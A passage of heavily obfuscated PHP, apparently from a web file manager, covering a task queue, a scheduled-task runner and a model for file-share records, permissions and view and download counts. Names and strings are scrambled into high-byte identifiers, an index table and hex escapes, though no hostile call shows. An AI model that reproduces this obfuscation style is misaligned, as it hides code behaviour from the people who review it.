$İŞÒÌÇ . size_format($üöìÜ¼š[$­Óü½š[1811]]) . $­Óü½š[8] . size_format($üöìÜ¼š[$­Óü½š[1162]]); $’‰°…Àœ = size_format($üöìÜ¼š[$­Óü½š[1813]]) . $­Óü½š[1905]; } if ($üöìÜ¼š[$­Óü½š[1164]]) { $üöìÜ¼š[$­Óü½š[1862]] = $üöìÜ¼š[$­Óü½š[1164]] . $­Óü½š[53] . $üöìÜ¼š[$­Óü½š[1862]]; } if ($üöìÜ¼š[$­Óü½š[1862]]) { $â¡¡ş€ = $­Óü½š[12]; if ($üöìÜ¼š[$­Óü½š[1864]]) { $â¡¡ş€ = $­Óü½š[50] . size_format($üöìÜ¼š[$­Óü½š[1865]]) . $­Óü½š[8] . size_format($üöìÜ¼š[$­Óü½š[1864]]); } $’‰°…Àœ .= $üöìÜ¼š[$­Óü½š[1862]] . $â¡¡ş€; } if ($üöìÜ¼š[$­Óü½š[853]] && !$üöìÜ¼š[$­Óü½š[1864]]) { $’‰°…Àœ .= $­Óü½š[53] . size_format($üöìÜ¼š[$­Óü½š[1869]]) . $­Óü½š[8] . size_format($üöìÜ¼š[$­Óü½š[853]]); } echoLog($©•¢·¡Ã . $­Óü½š[53] . $’‰°…Àœ, !0); } public function taskEnd($·Ì‰¶åò) { $‡İÆÍÜü =& $_SERVER[Î·Ü›öğ]; if (!$·Ì‰¶åò || $this->taskID != $·Ì‰¶åò[$‡İÆÍÜü[477]]) { return; } $´Î¸ƒëß = $·Ì‰¶åò ? LNG($‡İÆÍÜü[1906]) . $‡İÆÍÜü[4] . $·Ì‰¶åò[$‡İÆÍÜü[1811]] . $‡İÆÍÜü[8] . $·Ì‰¶åò[$‡İÆÍÜü[1162]] . LNG($‡İÆÍÜü[1904]) . $‡İÆÍÜü[74] : $‡İÆÍÜü[12]; echoLog($‡İÆÍÜü[1907] . $·Ì‰¶åò[$‡İÆÍÜü[1696]] . ($·Ì‰¶åò[$‡İÆÍÜü[537]] ? $‡İÆÍÜü[74] . $·Ì‰¶åò[$‡İÆÍÜü[537]] : $‡İÆÍÜü[12]) . $‡İÆÍÜü[74] . $´Î¸ƒëß . $‡İÆÍÜü[1908] . sprintf($‡İÆÍÜü[951], timeFloat() - $·Ì‰¶åò[$‡İÆÍÜü[1814]]) . $‡İÆÍÜü[1826]); $this->end(); } public function taskKill($ñÛ« ) { $öÂ³®ÀÁ =& $_SERVER[Î·Ü›öğ]; if (!$ñÛ«  || $this->taskID != $ñÛ« [$öÂ³®ÀÁ[477]]) { return; } echoLog($öÂ³®ÀÁ[1909] . $ñÛ« [$öÂ³®ÀÁ[1696]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\x65\165\x65\x4c\x65\156\147\164\x68"; const QUEUE_DATA = "\164\x61\163\x6b\121\165\145\x75\145\x44\x61\x74\141"; const QUEUE_TIME = "\164\x61\x73\153\121\165\145\x75\145\x4c\141\x73\164\x52\x75\x6e"; const QUEUE_THREAD = "\164\x61\163\153\121\165\x65\x75\x65\x54\150\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¡€¯ØÁÊ, $¹îÙÎ§¶ = array(), $§«½Â÷è = '', $Àëì­˜ü = '') { $íâ¦ŠÛ =& $_SERVER[Î·Ü›öğ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Àëì­˜ü && array_find_by_field(self::$listData, $íâ¦ŠÛ[97], $Àëì­˜ü)) { return !0; } if ($Àëì­˜ü && array_find_by_field(self::$listDataAdd, $íâ¦ŠÛ[97], $Àëì­˜ü)) { return !0; } self::$listDataAdd[] = array($íâ¦ŠÛ[344] => $¡€¯ØÁÊ, $íâ¦ŠÛ[1910] => $¹îÙÎ§¶, $íâ¦ŠÛ[537] => $§«½Â÷è, $íâ¦ŠÛ[97] => $Àëì­˜ü); return !0; } public static function addSubmit() { $‡“Ğ£È =& $_SERVER[Î·Ü›öğ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($‡“Ğ£È[1911] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $‡“Ğ£È[12], $‡“Ğ£È[537])), $‡“Ğ£È[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($úÑ™Ç£˜, $ÛÎÇ–ã³ = array(), $Üäìˆ¢à = '', $¼ßèãï€ = '') { $¼§ÊÌ¨ =& $_SERVER[Î·Ü›öğ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $úèëë¼« = self::getAll(); if ($¼ßèãï€ && array_find_by_field($úèëë¼«, $¼§ÊÌ¨[97], $¼ßèãï€)) { return !0; } $úèëë¼«[] = array($¼§ÊÌ¨[344] => $úÑ™Ç£˜, $¼§ÊÌ¨[1910] => $ÛÎÇ–ã³, $¼§ÊÌ¨[537] => $Üäìˆ¢à, $¼§ÊÌ¨[97] => $¼ßèãï€); self::setAll($úèëë¼«); write_log($¼§ÊÌ¨[1911] . $Üäìˆ¢à, $¼§ÊÌ¨[198]); return !0; } public static function run() { $ÆĞ‚Òª­ =& $_SERVER[Î·Ü›öğ]; $••ıôü„ = self::getAll(); $ö§¦‡µÂ = array_shift($••ıôü„); if (!$ö§¦‡µÂ) { return !1; } self::setAll($••ıôü„); $¨‘¬õº’ = timeFloat(); $ô²íöº = $ÆĞ‚Òª­[12]; try { $ô²íöº = Hook::apply($ö§¦‡µÂ[$ÆĞ‚Òª­[344]], $ö§¦‡µÂ[$ÆĞ‚Òª­[1910]]); } catch (Exception $Ü–ÉÜÜß) { write_log($Ü–ÉÜÜß, $ÆĞ‚Òª­[1294]); } $µš¶¸áû = number_format(timeFloat() - $¨‘¬õº’, 3) . $ÆĞ‚Òª­[1826]; if ($ô²íöº && is_string($ô²íöº)) { $µš¶¸áû = $µš¶¸áû . $ÆĞ‚Òª­[1912] . $ô²íöº; } write_log($ÆĞ‚Òª­[1913] . $ö§¦‡µÂ[$ÆĞ‚Òª­[537]] . $ÆĞ‚Òª­[1914] . $µš¶¸áû, $ÆĞ‚Òª­[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $õã®ŞùÈ =& $_SERVER[Î·Ü›öğ]; $—Ÿ´·ÒØ = self::threadCount() + 1; if ($—Ÿ´·ÒØ > 3 || !self::count()) { return; } write_log($õã®ŞùÈ[1915] . $—Ÿ´·ÒØ, $õã®ŞùÈ[198]); Cache::set(self::QUEUE_THREAD, $—Ÿ´·ÒØ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($õã®ŞùÈ[1916], $õã®ŞùÈ[198]); } public static function getKey($ÛÀ˜ë‹ö, $ö‡Ášè = "\x69\156\x74") { $ìŠ¶¥×Ö =& $_SERVER[Î·Ü›öğ]; Cache::removeMemory($ÛÀ˜ë‹ö); $¾òİÇêã = Cache::get($ÛÀ˜ë‹ö); if ($ö‡Ášè == $ìŠ¶¥×Ö[366]) { return $¾òİÇêã ? intval($¾òİÇêã) : 0; } if ($ö‡Ášè == $ìŠ¶¥×Ö[1917]) { return is_array($¾òİÇêã) ? $¾òİÇêã : array(); } return $¾òİÇêã; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[Î·Ü›öğ][1917]); } public static function setAll($È¢¬Ù) { $çµæóş = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($È¢¬Ù), $çµæóş); Cache::set(self::QUEUE_DATA, $È¢¬Ù, $çµæóş); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ç­ÓàÜŸ, $ÑÍ¡¯ªâ = 5.0) { if (!$Ç­ÓàÜŸ) { return; } $ÇÉ¦¢ƒù = Cache::get($Ç­ÓàÜŸ); if (!$ÇÉ¦¢ƒù || timeFloat() - floatVal($ÇÉ¦¢ƒù) >= $ÑÍ¡¯ªâ) { Cache::set($Ç­ÓàÜŸ, timeFloat(), $ÑÍ¡¯ªâ * 10); return !0; } return !1; } public static function timeLimitCall($€µü¿’ß, $šÕŠ’´¨, $Öò›Œ€¿, $ÙÑÜ¾  = 5.0) { $š¯®‹¾© =& $_SERVER[Î·Ü›öğ]; if (!$€µü¿’ß || !$šÕŠ’´¨) { return; } self::$asyncAdd = !0; $ˆÈ ©İ¾ = $š¯®‹¾©[1918]; $Äñ£± = Cache::get($ˆÈ ©İ¾, !0); $ÄóÆ¹å© = array($š¯®‹¾©[1919] => timeFloat(), $š¯®‹¾©[1920] => timeFloat(), $š¯®‹¾©[344] => $šÕŠ’´¨, $š¯®‹¾©[1910] => $Öò›Œ€¿, $š¯®‹¾©[1921] => $ÙÑÜ¾ ); if (is_array($Äñ£±[$€µü¿’ß])) { if (timeFloat() - $Äñ£±[$€µü¿’ß][$š¯®‹¾©[1919]] <= $ÄóÆ¹å©[$š¯®‹¾©[1921]] * 0.5) { return; } $ÄóÆ¹å©[$š¯®‹¾©[1920]] = $Äñ£±[$€µü¿’ß][$š¯®‹¾©[1920]]; } $Äñ£±[$€µü¿’ß] = $ÄóÆ¹å©; Cache::set($ˆÈ ©İ¾, $Äñ£±, 60); Cache::removeMemory($ˆÈ ©İ¾); write_log($š¯®‹¾©[1922] . $€µü¿’ß . $š¯®‹¾©[74] . $šÕŠ’´¨ . $š¯®‹¾©[1923] . ACTION, $š¯®‹¾©[198]); } public static function timeLimitCallLoop() { $—­û²Ò =& $_SERVER[Î·Ü›öğ]; $£è¡ÜÎ… = array($—­û²Ò[1924]); $¥ä‰ï¸í = in_array(strtolower(ACTION), $£è¡ÜÎ…); if (!$¥ä‰ï¸í && !self::$asyncAdd) { return; } $ÚÚ¡¶¾” = $—­û²Ò[1918]; $êË—ó‘ª = Cache::get($ÚÚ¡¶¾”, !0); if (!$êË—ó‘ª || count($êË—ó‘ª) <= 0) { return; } $ñ˜“¾Æƒ = timeFloat(); $È´¨Ôæ¼ = array(); $ºÙ‚áàü = array(); foreach ($êË—ó‘ª as $ûæÒÛ£Î => $Ø–ªäÕ ) { if ($ñ˜“¾Æƒ - $Ø–ªäÕ [$—­û²Ò[1920]] > $Ø–ªäÕ [$—­û²Ò[1921]]) { $ºÙ‚áàü[$ûæÒÛ£Î] = $Ø–ªäÕ ; continue; } $È´¨Ôæ¼[$ûæÒÛ£Î] = $Ø–ªäÕ ; } if (count($ºÙ‚áàü) == 0) { return; } if (count($È´¨Ôæ¼) == 0) { Cache::remove($ÚÚ¡¶¾”); } else { Cache::set($ÚÚ¡¶¾”, $È´¨Ôæ¼, 60); } Cache::removeMemory($ÚÚ¡¶¾”); self::runArr($ºÙ‚áàü); } public static function finished($Õ“ô³¶†, $–¸ø‰ó·) { $ŸĞ¦ ¨Û =& $_SERVER[Î·Ü›öğ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ŸĞ¦ ¨Û[344] => $Õ“ô³¶†, $ŸĞ¦ ¨Û[1910] => $–¸ø‰ó·); } private static function runArr($Æı»²·) { $¨º’•€İ =& $_SERVER[Î·Ü›öğ]; if (!$Æı»²·) { return; } foreach ($Æı»²· as $Š±²±Ñ‰ => $¦ùÂ„¶·) { try { Hook::apply($¦ùÂ„¶·[$¨º’•€İ[344]], $¦ùÂ„¶·[$¨º’•€İ[1910]]); write_log($¨º’•€İ[1925] . $Š±²±Ñ‰ . $¨º’•€İ[74] . $¦ùÂ„¶·[$¨º’•€İ[344]] . $¨º’•€İ[1923] . ACTION, $¨º’•€İ[198]); } catch (Exception $µ«Ùõõ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto c¾Ÿ¢Ì£¼ö; FÖ·³ÓóŒ¡: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\x72\145"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\155\145", "\x74\151\155\x65", "\x69\x6e\x73\x65\x72\164\x2c\165\x70\x64\141\164\x65", "\146\x75\x6e\x63\164\x69\157\x6e"), array("\x63\162\145\x61\164\145\124\x69\x6d\145", "\164\x69\155\x65", "\x69\156\x73\145\x72\x74", "\146\x75\156\x63\x74\x69\x6f\x6e"), array("\157\160\x74\x69\x6f\156\163", '', "\151\x6e\163\145\162\164\54\x75\x70\144\x61\x74\x65\x2c\163\x65\x6c\x65\143\164", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÚŞ¬óˆ) { $ÊØÏ›–Æ =& $_SERVER[Î·Ü›öğ]; $ĞÃÀï÷ı = isset($ÚŞ¬óˆ[0]) ? $ÚŞ¬óˆ[0] : !1; $Öªôõáâ = $ÊØÏ›–Æ[2152] . USER_ID; return array($ÊØÏ›–Æ[2153] => array(USER_ID, $ÊØÏ›–Æ[2154]), $ÊØÏ›–Æ[2093] => array($ĞÃÀï÷ı, $ÊØÏ›–Æ[2155], $Öªôõáâ)); } protected function listSimple() { $¸ºÎ‰Å› = array($_SERVER[Î·Ü›öğ][1810] => USER_ID); $È–¿˜ôÈ = $this->field($this->fieldList)->where($¸ºÎ‰Å›)->select(); return $È–¿˜ôÈ ? $È–¿˜ôÈ : array(); } protected function getInfo($ÉÂúğ…Æ, $Ï¹²³ı = false, $°ÊøµÕ– = '') { $¥ å×Âˆ =& $_SERVER[Î·Ü›öğ]; if (!$°ÊøµÕ–) { $°ÊøµÕ– = $¥ å×Âˆ[2152] . USER_ID; } if ($Ï¹²³ı) { return $this->_getShareInfo(array($¥ å×Âˆ[681] => $ÉÂúğ…Æ)); } $‰Çù»« = $this->cacheFunctionGet($¥ å×Âˆ[2095], $ÉÂúğ…Æ, $°ÊøµÕ–); $ÑØ±·§‚ = $this->shareInfoMofify($‰Çù»«, $¥ å×Âˆ[226]); if (isset($‰Çù»«[$¥ å×Âˆ[88]]) && $ÑØ±·§‚ != $‰Çù»«[$¥ å×Âˆ[88]]) { $³¯ÖÙêû = $this->cacheKeyMake($¥ å×Âˆ[2095], $ÉÂúğ…Æ, $°ÊøµÕ–); $‰Çù»« = $this->_getShareInfo(array($¥ å×Âˆ[681] => $ÉÂúğ…Æ)); Cache::set($³¯ÖÙêû, $‰Çù»«); } return $‰Çù»«; } private function shareInfoMofify(&$áş¡³Ç, $€²ŒÌ´¼ = "\x67\x65\x74") { $“å›©Ñ¤ =& $_SERVER[Î·Ü›öğ]; if (!$áş¡³Ç || !isset($áş¡³Ç[$“å›©Ñ¤[681]])) { return; } $ƒË‡¢¤» = $“å›©Ñ¤[2156] . $áş¡³Ç[$“å›©Ñ¤[681]]; if ($€²ŒÌ´¼ == $“å›©Ñ¤[226]) { return Cache::get($ƒË‡¢¤»); } else { if ($€²ŒÌ´¼ == $“å›©Ñ¤[2124]) { $•ºº‹£ = Cache::get($ƒË‡¢¤»); if ($•ºº‹£ === $áş¡³Ç[$“å›©Ñ¤[88]]) { return; } $áş¡³Ç[$“å›©Ñ¤[2157]] = USER_ID . $“å›©Ñ¤[464] . $áş¡³Ç[$“å›©Ñ¤[88]]; Cache::set($ƒË‡¢¤», $áş¡³Ç[$“å›©Ñ¤[88]]); } else { if ($€²ŒÌ´¼ == $“å›©Ñ¤[2158]) { Cache::remove($ƒË‡¢¤»); } } } } public function getInfoByHash($Ø¸š²Ã ) { return $this->_getShareInfo(array($_SERVER[Î·Ü›öğ][2159] => $Ø¸š²Ã )); } public function getInfoByPath($åŠîªºˆ) { $”Ò²˜½ =& $_SERVER[Î·Ü›öğ]; $ş¬íÍË = array($”Ò²˜½[1810] => USER_ID, $”Ò²˜½[194] => $åŠîªºˆ); return $this->_getShareInfo($ş¬íÍË); } public function getInfoBySourcePath($ï¹šÜ×Ä) { $ùœ¥´ˆÄ =& $_SERVER[Î·Ü›öğ]; $¿¥Ş™Ûê = array($ùœ¥´ˆÄ[1810] => USER_ID, $ùœ¥´ˆÄ[1287] => $ï¹šÜ×Ä); return $this->_getShareInfo($¿¥Ş™Ûê); } private function _getShareInfo($Û’àäüÚ) { $Ÿ»×­şÓ =& $_SERVER[Î·Ü›öğ]; $ÄÉô˜¡Ì = $this->where($Û’àäüÚ)->find(); if (!$ÄÉô˜¡Ì) { return !1; } $Û’àäüÚ = array($Ÿ»×­şÓ[681] => $ÄÉô˜¡Ì[$Ÿ»×­şÓ[681]]); $Íé¼¹±ğ = $Ÿ»×­şÓ[2160]; $’‘øŒ¶§ = Model($Ÿ»×­şÓ[682])->order($Ÿ»×­şÓ[477])->field($Íé¼¹±ğ)->where($Û’àäüÚ)->select(); if ($ÄÉô˜¡Ì[$Ÿ»×­şÓ[194]] == $Ÿ»×­şÓ[231]) { $ÄÉô˜¡Ì[$Ÿ»×­şÓ[90]] = IO::info($ÄÉô˜¡Ì[$Ÿ»×­şÓ[1287]]); } else { $ÄÉô˜¡Ì[$Ÿ»×­şÓ[90]] = Model($Ÿ»×­şÓ[1458])->pathInfo($ÄÉô˜¡Ì[$Ÿ»×­şÓ[194]]); } $ÄÉô˜¡Ì[$Ÿ»×­şÓ[2161]] = $’‘øŒ¶§; $this->shareInfoMofify($ÄÉô˜¡Ì, $Ÿ»×­şÓ[2124]); return $ÄÉô˜¡Ì; } protected function getInfoAuth($Ô•ÙŠïõ) { $î¡£ÃÆô =& $_SERVER[Î·Ü›öğ]; $ÊÊ¿î˜Ã = $this->getInfo($Ô•ÙŠïõ); if ($ÊÊ¿î˜Ã[$î¡£ÃÆô[1810]] == USER_ID) { $ÊÊ¿î˜Ã[$î¡£ÃÆô[498]] = $ÊÊ¿î˜Ã[$î¡£ÃÆô[90]][$î¡£ÃÆô[498]]; } else { $ÊÊ¿î˜Ã[$î¡£ÃÆô[498]] = Model($î¡£ÃÆô[580])->authMake($ÊÊ¿î˜Ã[$î¡£ÃÆô[2161]]); } return $ÊÊ¿î˜Ã; } protected function listData($‘üêÜ÷´ = null, $ºğ‡½¶” = 300) { $ãÆßÅ§… =& $_SERVER[Î·Ü›öğ]; $Ğóá¯ÈÂ = array(array($ãÆßÅ§…[575] => array($ãÆßÅ§…[1111], 0), $ãÆßÅ§…[679] => array($ãÆßÅ§…[1111], 0), $ãÆßÅ§…[2162] => $ãÆßÅ§…[2112])); if ($‘üêÜ÷´ == $ãÆßÅ§…[2163]) { $Ğóá¯ÈÂ = array($ãÆßÅ§…[575] => 1); } else { if ($‘üêÜ÷´ == $ãÆßÅ§…[1270]) { $Ğóá¯ÈÂ = array($ãÆßÅ§…[679] => 1); } } $Ğóá¯ÈÂ[$ãÆßÅ§…[1810]] = USER_ID; $Ş¨Û¿Õ” = $this->where($Ğóá¯ÈÂ)->selectPage($ºğ‡½¶”); return $Ş¨Û¿Õ”; } protected function listToMe($ñ¡ ûóÛ = 300) { $òÏŠı­º =& $_SERVER[Î·Ü›öğ]; $ò´œá·ê = Model($òÏŠı­º[2164])->userGroupParents(USER_ID); $Âµ³Ûæ¨ = array($òÏŠı­º[664] => SourceModel::TYPE_USER, $òÏŠı­º[582] => USER_ID); if ($ò´œá·ê) { $Âµ³Ûæ¨ = array(array($òÏŠı­º[664] => SourceModel::TYPE_USER, $òÏŠı­º[582] => USER_ID), array($òÏŠı­º[664] => SourceModel::TYPE_GROUP, $òÏŠı­º[582] => array($òÏŠı­º[7], $ò´œá·ê)), $òÏŠı­º[2162] => $òÏŠı­º[2112]); } $Üè¶à = Model($òÏŠı­º[682])->where($Âµ³Ûæ¨)->selectPage($ñ¡ ûóÛ); $­¦Ø²©ç = array_to_keyvalue_group($Üè¶à[$òÏŠı­º[447]], $òÏŠı­º[681]); if (!$­¦Ø²©ç) { return $Üè¶à; } $Ãşıâé¡ = $òÏŠı­º[2165]; $Âµ³Ûæ¨ = array($òÏŠı­º[681] => array($òÏŠı­º[503], array_keys($­¦Ø²©ç)), $òÏŠı­º[1810] => array($òÏŠı­º[1113], $òÏŠı­º[231])); $ãèÊâ‘‰ = $this->field($Ãşıâé¡)->where($Âµ³Ûæ¨)->select(); foreach ($ãèÊâ‘‰ as $œªÒ·ô© => &$†ïĞÌÚà) { $†ïĞÌÚà[$òÏŠı­º[2161]] = $­¦Ø²©ç[$†ïĞÌÚà[$òÏŠı­º[681]]]; } unset($†ïĞÌÚà); $­ÜáÄ„ = array($òÏŠı­º[2166] => $ãèÊâ‘‰, $òÏŠı­º[2167] => $Üè¶à[$òÏŠı­º[444]]); return $­ÜáÄ„; } protected function shareAdd($†ÉÆÊâÀ, $ÀÅÒ–Ü) { $ÌÕŞ¾ù² =& $_SERVER[Î·Ü›öğ]; $˜ÃË– = $this->_addShareData($†ÉÆÊâÀ, $ÀÅÒ–Ü); if (!empty($ÀÅÒ–Ü[$ÌÕŞ¾ù²[2168]])) { $this->_shareAuthSet($˜ÃË–, $ÀÅÒ–Ü[$ÌÕŞ¾ù²[2168]]); } $this->shareEventAdd($†ÉÆÊâÀ, $ÀÅÒ–Ü, $ÌÕŞ¾ù²[2169]); return $˜ÃË–; } protected function shareAddSystem($ÆÅ§’°Ò, $ úØ½ƒ) { $ùêèû€… =& $_SERVER[Î·Ü›öğ]; $‡İé•ƒî = $this->_addShareData($ÆÅ§’°Ò, $ úØ½ƒ, $ùêèû€…[192]); $this->_shareAuthSet($‡İé•ƒî, $ úØ½ƒ[$ùêèû€…[2168]]); return $‡İé•ƒî; } private function shareEventAdd($šàìâ¿, $—ªØÅèÉ, $ı³Üı‡‘ = "\x61\144\144") { $ùæÄ–ĞË =& $_SERVER[Î·Ü›öğ]; if (!$šàìâ¿ || $šàìâ¿ == $ùæÄ–ĞË[231]) { return; } if ($ı³Üı‡‘ == $ùæÄ–ĞË[2169]) { if ($—ªØÅèÉ[$ùæÄ–ĞË[575]] == $ùæÄ–ĞË[91]) { Model($ùæÄ–ĞË[649])->eventShare($šàìâ¿, $ùæÄ–ĞË[2170]); } if ($—ªØÅèÉ[$ùæÄ–ĞË[679]] == $ùæÄ–ĞË[91]) { Model($ùæÄ–ĞË[649])->eventShare($šàìâ¿, $ùæÄ–ĞË[2171]); } return; } $”¨Óá = $this->getInfoByPath($šàìâ¿); $“•Ù«Õ = $ùæÄ–ĞË[2172]; if ($”¨Óá[$ùæÄ–ĞË[575]] == $ùæÄ–ĞË[231] && $—ªØÅèÉ[$ùæÄ–ĞË[575]] == $ùæÄ–ĞË[91]) { $“•Ù«Õ = $ùæÄ–ĞË[2170]; } if ($”¨Óá[$ùæÄ–ĞË[575]] == $ùæÄ–ĞË[91] && $—ªØÅèÉ[$ùæÄ–ĞË[575]] == $ùæÄ–ĞË[231]) { $“•Ù«Õ = $ùæÄ–ĞË[2173]; } if ($”¨Óá[$ùæÄ–ĞË[679]] == $ùæÄ–ĞË[231] && $—ªØÅèÉ[$ùæÄ–ĞË[679]] == $ùæÄ–ĞË[91]) { $“•Ù«Õ = $ùæÄ–ĞË[2171]; } if ($”¨Óá[$ùæÄ–ĞË[679]] == $ùæÄ–ĞË[91] && $—ªØÅèÉ[$ùæÄ–ĞË[679]] == $ùæÄ–ĞË[231]) { $“•Ù«Õ = $ùæÄ–ĞË[2174]; } Model($ùæÄ–ĞË[649])->eventShare($šàìâ¿, $“•Ù«Õ); return; } private function _addShareData($Ú˜¿ÉæÚ, $·ùø¹ÀÒ = array(), $×“Êìâ = false) { $Û½ˆí• =& $_SERVER[Î·Ü›öğ]; $»Ã²äå† = $×“Êìâ == $Û½ˆí•[192] ? 0 : USER_ID; $ÃØì¦øÜ = array($Û½ˆí•[502] => $Ú˜¿ÉæÚ, $Û½ˆí•[1801] => $»Ã²äå†); if ($Ú˜¿ÉæÚ == 0) { $ÃØì¦øÜ = array($Û½ˆí•[2175] => $·ùø¹ÀÒ[$Û½ˆí•[1287]], $Û½ˆí•[1801] => $»Ã²äå†); } if ($Ïã¶¹‹Ô = $this->where($ÃØì¦øÜ)->find()) { return $Ïã¶¹‹Ô[$Û½ˆí•[681]]; } if ($Ú˜¿ÉæÚ == 0) { $éîˆ–é = array($Û½ˆí•[32] => get_path_this($·ùø¹ÀÒ[$Û½ˆí•[87]])); } else { $éîˆ–é = Model($Û½ˆí•[922])->sourceInfo($Ú˜¿ÉæÚ); if (!$éîˆ–é) { return !1; } } if (!$·ùø¹ÀÒ[$Û½ˆí•[1696]]) { $·ùø¹ÀÒ[$Û½ˆí•[1696]] = $éîˆ–é[$Û½ˆí•[32]]; } $×¢¨€›¯ = array($Û½ˆí•[1801] => $»Ã²äå†, $Û½ˆí•[502] => $Ú˜¿ÉæÚ, $Û½ˆí•[1696] => $Û½ˆí•[12], $Û½ˆí•[575] => 0, $Û½ˆí•[679] => 0, $Û½ˆí•[1287] => $Û½ˆí•[12], $Û½ˆí•[384] => $Û½ˆí•[12], $Û½ˆí•[988] => $Û½ˆí•[12], $Û½ˆí•[2176] => 0, $Û½ˆí•[2177] => 0, $Û½ˆí•[851] => 0, $Û½ˆí•[2178] => $Û½ˆí•[12], $Û½ˆí•[2159] => $Û½ˆí•[12]); $»É´Éá = explode($Û½ˆí•[50], $Û½ˆí•[2179]); foreach ($»É´Éá as $Û•Ô‰ñà) { if (!isset($·ùø¹ÀÒ[$Û•Ô‰ñà])) { continue; } $×¢¨€›¯[$Û•Ô‰ñà] = $·ùø¹ÀÒ[$Û•Ô‰ñà]; } $ôë¦Ïè = $this->add($×¢¨€›¯); $ëÛ’•ã = array($Û½ˆí•[2159] => short_id($ôë¦Ïè)); if ($this->where($ëÛ’•ã)->find()) { $ëÛ’•ã[$Û½ˆí•[2159]] .= $Û½ˆí•[464] . rand_string(2, 3); } $this->where(array($Û½ˆí•[2180] => $ôë¦Ïè))->save($ëÛ’•ã); return $ôë¦Ïè; } private function _shareAuthSet($ŒÎƒ¯» , $Û¾ô¼Úğ) { $íµ±È¢º =& $_SERVER[Î·Ü›öğ]; if (!is_array($Û¾ô¼Úğ)) { return !1; } $¹ĞœØô = Model($íµ±È¢º[2122]); $¹ĞœØô->where(array($íµ±È¢º[681] => $ŒÎƒ¯» ))->delete(); $Üá’ş™ = array(); foreach ($Û¾ô¼Úğ as $Ôç‡¬“) { $’Úûùúå = SourceModel::TYPE_USER; if ($Ôç‡¬“[$íµ±È¢º[191]] == SourceModel::TYPE_GROUP) { $’Úûùúå = SourceModel::TYPE_GROUP; } $‘œåÊôÆ = array($íµ±È¢º[681] => $ŒÎƒ¯» , $íµ±È¢º[191] => $’Úûùúå, $íµ±È¢º[582] => intval($Ôç‡¬“[$íµ±È¢º[582]]), $íµ±È¢º[2118] => 0, $íµ±È¢º[2181] => -1); if ($Ôç‡¬“[$íµ±È¢º[2118]]) { $‘œåÊôÆ[$íµ±È¢º[2118]] = $Ôç‡¬“[$íµ±È¢º[2118]]; } else { if ($Ôç‡¬“[$íµ±È¢º[2181]]) { $‘œåÊôÆ[$íµ±È¢º[2181]] = $Ôç‡¬“[$íµ±È¢º[2181]]; } } $Üá’ş™[] = $‘œåÊôÆ; } return $¹ĞœØô->addAll($Üá’ş™, array(), !0); } public function numViewAdd($ˆŠçÁÙÑ) { $èÖœÎŠ =& $_SERVER[Î·Ü›öğ]; $ë áâ = array($èÖœÎŠ[2180] => $ˆŠçÁÙÑ); $this->where($ë áâ)->setAdd($èÖœÎŠ[2176]); } public function numDownloadAdd($ñ¸ƒÌí¸) { $©ˆı’Ãî =& $_SERVER[Î·Ü›öğ]; $…¤·ˆÄ = array($©ˆı’Ãî[2180] => $ñ¸ƒÌí¸); $this->where($…¤·ˆÄ)->setAdd($©ˆı’Ãî[2177]); } protected function shareEdit($œ¿ı¿àş, $¨¾ü›–‚) { $è¢€½çô =& $_SERVER[Î·Ü›öğ]; $ß‡˜ÓäÜ = $this->getInfo($œ¿ı¿àş); if (!$ß‡˜ÓäÜ) { return !1; } if ($¨¾ü›–‚[$è¢€½çô[2159]] && $¨¾ü›–‚[$è¢€½çô[575]] == $è¢€½çô[91]) { if ($¨¾ü›–‚[$è¢€½çô[2159]] == $ß‡˜ÓäÜ[$è¢€½çô[2159]]) { unset($¨¾ü›–‚[$è¢€½çô[2159]]); } if ($¨¾ü›–‚[$è¢€½çô[2159]]) { $¹Ó£ìœ = $this->where(array($è¢€½çô[2182] => $¨¾ü›–‚[$è¢€½çô[2159]]))->find(); if ($¹Ó£ìœ) { return !1; } if (!is_array($¨¾ü›–‚[$è¢€½çô[2178]])) { $¨¾ü›–‚[$è¢€½çô[2178]] = is_array($ß‡˜ÓäÜ[$è¢€½çô[2178]]) ? $ß‡˜ÓäÜ[$è¢€½çô[2178]] : array(); } if (!$¨¾ü›–‚[$è¢€½çô[2178]][$è¢€½çô[2183]]) { $¨¾ü›–‚[$è¢€½çô[2178]][$è¢€½çô[2183]] = $ß‡˜ÓäÜ[$è¢€½çô[2159]]; $¨¾ü›–‚[$è¢€½çô[2178]][$è¢€½çô[2184]] = $è¢€½çô[91]; } } } $this->_checkLinkShare($¨¾ü›–‚, $ß‡˜ÓäÜ); $Ôßî£ü = array(); $®·…œä = explode($è¢€½çô[50], $è¢€½çô[2185]); foreach ($®·…œä as $ô•°şÜ¹) { if (!array_key_exists($ô•°şÜ¹, $¨¾ü›–‚)) { continue; } $Ôßî£ü[$ô•°şÜ¹] = $¨¾ü›–‚[$ô•°şÜ¹]; } 